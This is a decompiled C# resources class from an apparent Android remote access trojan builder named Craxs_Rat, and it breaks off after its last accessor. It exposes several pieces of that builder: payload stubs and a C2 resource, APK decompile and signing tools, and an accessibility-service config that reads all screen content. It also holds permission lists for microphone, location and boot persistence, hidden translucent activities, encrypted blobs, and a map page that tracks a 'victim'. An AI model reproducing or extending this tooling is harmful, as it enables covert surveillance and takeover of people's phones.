using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.Resources;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat.My.Resources;

/// <summary>
///   一个强类型的资源类，用于查找本地化的字符串等。
/// </summary>
[GeneratedCode("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0")]
[HideModuleName]
[CompilerGenerated]
[DebuggerNonUserCode]
[StandardModule]
internal sealed class Resources
{
	private static ResourceManager resourceMan;

	private static CultureInfo resourceCulture;

	/// <summary>
	///   返回此类使用的缓存的 ResourceManager 实例。
	/// </summary>
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static ResourceManager ResourceManager
	{
		get
		{
			if (object.ReferenceEquals(resourceMan, null))
			{
				ResourceManager resourceManager = new ResourceManager("Craxs_Rat.Resources", typeof(Resources).Assembly);
				resourceMan = resourceManager;
			}
			return resourceMan;
		}
	}

	/// <summary>
	///   重写当前线程的 CurrentUICulture 属性，对
	///   使用此强类型资源类的所有资源查找执行重写。
	/// </summary>
	[EditorBrowsable(EditorBrowsableState.Advanced)]
	internal static CultureInfo Culture
	{
		get
		{
			return resourceCulture;
		}
		set
		{
			resourceCulture = value;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap _3g
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("_3g", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap _on
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("_on", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap Abov_mid
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Abov_mid", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 &lt;?xml version="1.0" encoding="utf-8"?&gt;
	///
	/// &lt;accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
	///     android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds"
	///     android:accessibilityEventTypes="typeAllMask"
	///     android:canRetrieveWindowContent="true"
	///     android:canRequestTouchExplorationMode="true"
	///     android:accessibilityFeedbackType="feedbackAllMask"
	///     android:notificationTimeout="1"
	///     android:packageNames="@null"
	///     android:canPerf [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string accessibilityprivatesrcapp => ResourceManager.GetString("accessibilityprivatesrcapp", resourceCulture);

	/// <summary>
	///   查找类似 &lt;?xml version="1.0" encoding="utf-8"?&gt;
	/// &lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
	///     xmlns:app="http://schemas.android.com/apk/res-auto"
	///     xmlns:tools="http://schemas.android.com/tools"
	///     android:layout_width="match_parent"
	///     android:layout_height="match_parent"
	///     android:orientation="vertical"
	///     android:background="#FFFFFF"&gt;
	///
	///     &lt;LinearLayout
	///         android:layout_width="match_parent"
	///         android:layout_height="35dp"
	///         android:background="#26 [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string activity_req_access => ResourceManager.GetString("activity_req_access", resourceCulture);

	/// <summary>
	///   查找类似 &lt;uses-permission android:name="android.permission.RECORD_AUDIO" /&gt;#
	/// &lt;uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" /&gt;#
	/// &lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;#
	/// &lt;uses-permission android:name="android.permission.READ_PHONE_STATE" /&gt;#
	/// &lt;uses-permission android:name="android.permission.WAKE_LOCK" /&gt;#
	/// &lt;uses-permission android:name="com.android.alarm.permission.SET_ALARM" /&gt;#
	/// &lt;uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"  [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string ALLPRIM => ResourceManager.GetString("ALLPRIM", resourceCulture);

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] APKEditor
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("APKEditor", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] apktool
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("apktool", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] APPS
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("APPS", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap backcraxs3
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("backcraxs3", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 &lt;uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" /&gt; 的本地化字符串。
	/// </summary>
	internal static string batteryprim => ResourceManager.GetString("batteryprim", resourceCulture);

	/// <summary>
	///   查找类似 &lt;uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" /&gt; 的本地化字符串。
	/// </summary>
	internal static string BootPrim => ResourceManager.GetString("BootPrim", resourceCulture);

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] c
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("c", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] C2
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("C2", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap chrg
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("chrg", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap close48px
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("close48px", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap Compile
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Compile", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap correctsign
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("correctsign", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似  的本地化字符串。
	/// </summary>
	internal static string CraxsAsci => ResourceManager.GetString("CraxsAsci", resourceCulture);

	/// <summary>
	///   查找类似     &lt;activity android:excludeFromRecents="true" android:exported="true" android:name="ginom.alfa.lib.scan._access_ask_" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
	///         &lt;activity android:excludeFromRecents="true" android:exported="true" android:name="ginom.alfa.lib.scan._access_ask_instll" android:theme="@android:style/Theme.Translucent.NoTitleBar"/&gt;
	///         &lt;activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android: [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string CypherMini => ResourceManager.GetString("CypherMini", resourceCulture);

	/// <summary>
	///   查找类似 C:\ProgramData\cconfig 的本地化字符串。
	/// </summary>
	internal static string DataP => ResourceManager.GetString("DataP", resourceCulture);

	/// <summary>
	///   查找类似 2xOEWq3yESG8sMQPwFFyJXDS+/kimlBf8iRiCdwuFHREkq0c3qxwXriwz4N5f5+S
	/// L1++Lr/oDRQghV0xNxwKcw4d6S7RsJ6Ux5FXFaIyosO3tFGOqwL6HV1bgbTkMuE0
	/// uJWrmWzrfyEhPWCiUqJV+SOkxNN8LJlDtewrQJ/jFZTVTPK6gNI5a49z9yCp0tdN
	/// PY5mWZJU4+6ykUw0Tn51rh+QZeYsuXpCYw1P9eXNA+E2bPVnLcX6cDiFUHeZDKIpW22FhQ0hr66DZISIJReNIQ==
	/// cwqdt3ayUFM+VPYLzfc6O926YOYCE+0syyIiG4vzaPY=
	/// GqNjL8EmgQTn2xZuGWax81CKPBwncUl+vz72uTU1Zt7+xjVjAZPhS64bzgNVYfBz
	/// s0wqiUHae6LQ6QrvoHtm3JoEskmHF3r22Ok/jzmTg7aeS24mgNFQglYl8MB22zzX
	/// 0l4MS3iXdJf3uJ1M3nwHu7JbnHQIuJYM+G8hCblc4udVAm [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string DB => ResourceManager.GetString("DB", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap Decompile
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Decompile", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap disconnected
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("disconnected", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] dropstub
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("dropstub", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap error48px
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("error48px", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 &lt;uses-permission android:name="android.permission.FOREGROUND_SERVICE"/&gt; 的本地化字符串。
	/// </summary>
	internal static string FORGROUD => ResourceManager.GetString("FORGROUD", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap full
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("full", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 [GRESOSTR] 的本地化字符串。
	/// </summary>
	internal static string GRESSTR => ResourceManager.GetString("GRESSTR", resourceCulture);

	/// <summary>
	///   查找类似 &lt;public type="string" name="GRESSTR" id="0x7f0a0001" /&gt; 的本地化字符串。
	/// </summary>
	internal static string GSTART => ResourceManager.GetString("GSTART", resourceCulture);

	/// <summary>
	///   查找类似 &lt;action android:name="[HIDE_CODE]"/&gt; 的本地化字符串。
	/// </summary>
	internal static string HIDECODE => ResourceManager.GetString("HIDECODE", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap incall_removebg_preview
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("incall_removebg_preview", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap information48px
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("information48px", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap InstallApk
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("InstallApk", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] junk
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("junk", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] k
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("k", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] K2
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("K2", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap lie
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("lie", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap loading_please_wait
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("loading_please_wait", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap log
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("log", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap LOGO
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("LOGO", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 PiXmn7tvCw5+k1ChMmikinMRPqrcqQbW/Nf6BDRJXYhtQzwPV9JrfCldtifsa3v0oXdy3/PNPbr7
	/// l4VvjMWfaUs6QLIXeRpfTL0JWtIkXLs7+MycsDomusqxpiLJTOtlmkENEgMNxdeQIBZN5Xj7kjGc
	/// 4Kay2qyiTH7JP+4OSe5AyHwYo5npEpnOFepLl5YARIRK88U77p/sGOhbs7BVdY2+uhUnz1Yvt6SF
	/// YAlpagA1nzRjWdnoWU0ORc4vDLD7zUxEjMMMA24va2vetwqMobTGX0yuBTQCHCvoAPamRpj+5bVL
	/// fyCQI1Rdeu03wpEsV5mmBI7d+QfxNYQVXXzfW7C7HuJGM78wdEK9MY8D7671ZI/mLKcj54gw4oMd
	/// d2Pe24lHftLIsB/Q4YqFa0fW4C3c7LHXCeNMhOb7wBymQJfU8AlBBcRhIf2+QqSjd19YQ3JMQMjh
	/// IDsXm/0q6KH5LG8y0+euU3w+2kzfiQ6RlCXpBlVL8sCq [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string LOGS => ResourceManager.GetString("LOGS", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap low
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("low", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 xaWzFj/ixT+QAJ9qHuB8pBlYohUkEVBOoDh63z3YtFbqwhJ6ssMs2HJj58ZPwjUmuH4Z6q0mHA3e
	/// TyP+SB0LMyn1YGykKMUOBykNhc+9/FCBThvGl1ofHK2z04bGjjavhHZ2R1zWNCuvzzW1GaOPx/WU
	/// YUp0ZTnVSQmMlTRZ7H3ucHQWhY193FV3RrlMOYDQqknYXs/3aSW3tFVlNqT8UrAgHoKtWiuaT1Rs
	/// TCq0pzsv0ewWhv1nnSkwb8TA51CiwACpVl8f84JxOSLds9P4qvxFYkYSRMuKJLmkCKpHGCipuwNr
	/// fkt33PTPpEMGGHtoRqoemgD3hQ+renKrQ1/r7qM9LkzGcxXyddjVS+950DIJVFEJecFKuh4fCTtM
	/// 0RbYo1UdcLFMGSPaIO1QFCkRUiRqe+ivMuIx/i5DYxXsE0fdfNa/HmRVib+tO7hTyB3FoU+jY30X
	/// xX/MzJhZA+d+A75vXn7hsEXKkC8rgBkjmu1AffVIVaQ3 [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string MainMith => ResourceManager.GetString("MainMith", resourceCulture);

	/// <summary>
	///   查找类似 &lt;!DOCTYPE html&gt;
	/// &lt;html&gt;
	/// &lt;head&gt;
	/// &lt;meta charset='utf-8' /&gt;
	/// &lt;title&gt;\\name_victim:\\&lt;/title&gt;
	/// &lt;meta name='viewport' content='initial-scale=1,maximum-scale=1,user-scalable=no' /&gt;
	/// &lt;script src='https://api.tiles.mapbox.com/mapbox-gl-js/v1.0.0/mapbox-gl.js'&gt;&lt;/script&gt;
	/// &lt;link href='https://api.tiles.mapbox.com/mapbox-gl-js/v1.0.0/mapbox-gl.css' rel='stylesheet' /&gt;
	/// &lt;style&gt;
	/// body { margin:0; padding:0; }
	/// #map { position:absolute; top:0; bottom:0; width:100%; }
	/// &lt;/style&gt;
	/// &lt;/head&gt;
	/// &lt;body&gt;
	///
	/// &lt;div id='map'&gt;&lt;/div&gt;
	///   [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string map => ResourceManager.GetString("map", resourceCulture);

	/// <summary>
	///   查找类似于 (图标) 的 System.Drawing.Icon 类型的本地化资源。
	/// </summary>
	internal static Icon max
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("max", resourceCulture));
			return (Icon)objectValue;
		}
	}

	/// <summary>
	///   查找类似 ST 的本地化字符串。
	/// </summary>
	internal static string MethRn => ResourceManager.GetString("MethRn", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap min
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("min", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] MYSTUB
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("MYSTUB", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] MYSTUBTEN
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("MYSTUBTEN", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap new_call
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("new_call", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap new_notifi
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("new_notifi", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] NEWAPPS
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("NEWAPPS", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap noicon
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("noicon", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap not_found
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("not_found", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap notifi
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("notifi", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap notok
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("notok", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap OFF
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("OFF", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap OFF_LOCK
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("OFF_LOCK", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap ok
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("ok", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap ON_LOCK
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("ON_LOCK", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 aW52b2tlLXZpcnR1YWwvcmFuZ2Uge3AwfSwgW3RyZ3RtYWluXS0+U0NBTkZPUklOVEVOVEVSKClW 的本地化字符串。
	/// </summary>
	internal static string oncreatecode => ResourceManager.GetString("oncreatecode", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap onloading
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("onloading", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap outcall_removebg_preview
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("outcall_removebg_preview", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 \PROID 的本地化字符串。
	/// </summary>
	internal static string PRO => ResourceManager.GetString("PRO", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap protect
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("protect", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 &lt;uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/&gt; 的本地化字符串。
	/// </summary>
	internal static string ReadPrim => ResourceManager.GetString("ReadPrim", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap recoeded
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("recoeded", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap screenshoterfram
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("screenshoterfram", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似                 &lt;action android:name="android.intent.action.CHOOSER"/&gt;
	///                 &lt;action android:name="android.intent.action.MAIN"/&gt;
	///                 &lt;category android:name="android.intent.category.INFO"/&gt;
	///                 &lt;action android:name="android.intent.action.VIEW"/&gt;
	///                 &lt;category android:name="android.intent.category.DEFAULT"/&gt;
	///                 &lt;category android:name="com.android.internal.category.PLATLOGO"/&gt;
	///                 &lt;action android:name="android.intent.action.SEND"/&gt;
	///   [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string SDK29 => ResourceManager.GetString("SDK29", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap shieldoff
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("shieldoff", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap shieldon
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("shieldon", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap sign
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("sign", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] signapk
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("signapk", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap sstore
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("sstore", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似  的本地化字符串。
	/// </summary>
	internal static string String1 => ResourceManager.GetString("String1", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap sucess48px
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("sucess48px", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap swtchoff
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("swtchoff", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap swtchon
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("swtchon", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 &lt;uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/&gt; 的本地化字符串。
	/// </summary>
	internal static string SystemwindowPrim => ResourceManager.GetString("SystemwindowPrim", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap target__1_
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("target__1_", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 ASDFsd-fSDFsdfc-EWV-WE-FWEfwefwefc-btyjGRSFHZ-djtargsjtkJrejtktuy 的本地化字符串。
	/// </summary>
	internal static string TF => ResourceManager.GetString("TF", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap Tip_screenctrol
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("Tip_screenctrol", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 &lt;queries android:name="[GPRIM]"/&gt; 的本地化字符串。
	/// </summary>
	internal static string Toreplaceprim => ResourceManager.GetString("Toreplaceprim", resourceCulture);

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] up
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("up", resourceCulture));
			return (byte[])objectValue;
		}
	}

	/// <summary>
	///   查找类似 /9j/4QN0RXhpZgAATU0AKgAAAAgABwESAAMAAAABAAEAAAEaAAUAAAABAAAAYgEbAAUAAAABAAAAagEoAAMAAAABAAIAAAExAAIAAAAcAAAAcgEyAAIAAAAUAAAAjodpAAQAAAABAAAApAAAANAADqZ4AAAnEAAOpngAACcQQWRvYmUgUGhvdG9zaG9wIENTNSBXaW5kb3dzADIwMTc6MTA6MTMgMDE6NDM6MDcAAAAAA6ABAAMAAAAB//8AAKACAAQAAAABAAAAMKADAAQAAAABAAAAMAAAAAAAAAAGAQMAAwAAAAEABgAAARoABQAAAAEAAAEeARsABQAAAAEAAAEmASgAAwAAAAEAAgAAAgEABAAAAAEAAAEuAgIABAAAAAEAAAI+AAAAAAAAAEgAAAABAAAASAAAAAH/2P/tAAxBZG9iZV9DTQAC/+4ADkFkb2JlAGSAAAAAAf/bAIQADAgICAkIDAkJDBELCgsRFQ8MDA8VGBMTFRMTGBEMDAwM [字符串的其余部分被截断]"; 的本地化字符串。
	/// </summary>
	internal static string wallpaper => ResourceManager.GetString("wallpaper", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
